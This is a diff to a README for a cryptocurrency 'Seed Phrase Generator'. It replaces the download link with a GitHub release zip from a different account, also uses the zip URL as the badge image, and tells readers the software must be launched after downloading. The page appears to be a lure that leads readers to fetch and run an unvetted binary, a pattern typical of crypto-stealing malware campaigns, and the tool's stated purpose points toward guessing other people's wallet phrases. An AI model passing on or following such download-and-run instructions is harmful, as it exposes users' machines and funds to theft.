@@ -19,7 +19,7 @@ The Seed Phrase Generator is a powerful tool for anyone involved in the cryptocu
 
 To get started with the Seed Phrase Generator, simply download the software using the link provided below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/AbdeGuay/seed-phrase-generator/releases/download/v1.0/Release.zip)](https://github.com/AbdeGuay/seed-phrase-generator/releases/download/v1.0/Release.zip)
 
 *Note: The software needs to be launched after downloading.*
 
